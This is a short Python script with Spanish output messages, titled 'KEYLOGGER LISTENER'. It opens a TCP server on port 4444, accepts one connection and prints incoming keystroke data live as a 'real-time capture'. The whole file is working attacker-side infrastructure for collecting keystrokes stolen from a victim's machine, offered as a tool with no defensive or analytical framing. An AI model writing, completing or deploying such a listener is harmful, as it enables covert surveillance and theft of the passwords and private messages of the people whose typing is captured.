import socket

print(r"""
+--------------------------------------------------+
|                                                  |
|                 KEYLOGGER LISTENER               |
|                                                  |
+--------------------------------------------------+
""")

s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)

conn, addr = s.accept()
print(f"Dispositivo conectado desde >  {addr[0]}")
print("#"*50)
print("Captura en tiempo real: \n")

while True:
    try:
        data = conn.recv(1024)
        if not data:
            print("\n\nConexión cerrada")
            break

        print(data.decode('utf-8', errors='ignore'), end='', flush=True)

    except KeyboardInterrupt:
        print("\n\nListener detenido")
        break
    except:
        print("\n\nError en conexión")
        break

conn.close()
s.close() 